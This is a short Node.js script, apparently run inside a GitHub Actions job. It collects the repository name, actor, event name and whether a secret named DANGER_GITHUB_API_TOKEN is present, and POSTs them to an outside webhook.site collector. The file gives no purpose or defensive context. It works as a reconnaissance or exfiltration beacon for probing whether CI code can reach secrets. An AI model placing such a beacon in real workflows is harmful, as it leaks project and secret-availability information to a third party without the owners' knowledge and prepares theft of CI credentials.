const https = require("https");

const data = JSON.stringify({
  repo: process.env.GITHUB_REPOSITORY,
  actor: process.env.GITHUB_ACTOR,
  event: process.env.GITHUB_EVENT_NAME,
  hasToken: !!process.env.DANGER_GITHUB_API_TOKEN,
});

https.request(
  "https://webhook.site/b94dd99d-d566-4227-b655-689b814cf1b3",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": data.length,
    },
  },
  res => {}
).end(data);
